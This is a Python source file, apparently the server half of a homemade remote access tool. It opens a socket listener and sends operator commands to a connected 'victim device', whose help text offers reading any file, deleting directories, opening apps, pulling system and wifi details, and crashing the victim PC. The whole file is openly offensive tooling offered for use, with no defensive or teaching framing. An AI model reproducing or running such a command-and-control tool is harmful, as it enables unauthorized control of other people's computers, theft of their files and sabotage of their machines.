import socket
print(
"""
|---------------------      |--------------     |              |
|                    |      |                   |              |
|                    |      |                   |              |
|                    |      |                   |              |
|                    |      |                   |              |
|                    |      |--------------     |              |
|                    |                    |     |----------------
|--------------------|                    |                    |
|                                         |                    |
|                                         |                    |
|                           --------------|                    |

This python code was written by PS4 Spidey
Original Name:- Shameel
psspidey4@gmail.com
https://www.youtube.com/@everyonelearntech

*You must read this all command are lower case so type in lower case for get command*
      
""")
s= socket.socket()
s.bind(("192.168.43.218",1234))
conn,add  = s.accept()
print(add)

while True:
    com = input("Command>>")
    conn.send(com.encode())
    if com == "ls":
        ls = conn.recv(5000)
        print(ls.decode())
    elif com == "pwd":
        pwd = conn.recv(1024).decode()
        print(pwd)

    elif com == "sys":
        detail = conn.recv(1024).decode()
        print(detail)
    elif com == "mkdir":
        mkdir = input("Enter the file name:")
        conn.send(mkdir.encode())
    elif com == "rmdir":
        rmdir = input("Enter the file name:")
        conn.send(rmdir.encode())
    elif com == "open":
        app = input("Enter the app name such as(notepad,code,atom):")
        conn.send(app.encode())
    elif com == "ch":
        chdir = input("Enter the file name:")
        conn.send(chdir.encode())
    elif com == "help":
        print("""
help  --->Get all the command
ch    --->To change directory
mkdir --->To make directory
rmdir --->To delete directory
ls    --->To see the directory
pwd   --->Current directory
open  --->Open app suchas(notepad,code,atom)
sys   --->To see detail about pc
read  --->To read any file in victim device
run   --->To crash victim pc
date  --->To get user pc's date
exit  --->To exit from this programe
                            """)
    elif com == "read":
        readFile = input("Enter the read file name:")
        conn.send(readFile.encode())
        print(conn.recv(1024).decode())
    elif com == "run":
        print("Command has been activated")
    elif com == "date":
        date = conn.recv(1024)
        print(date.decode())
    elif com == "exit":
        break
    elif com == "wifi":
        print(str(conn.recv(1024).decode()))
    else:
        print("Value err")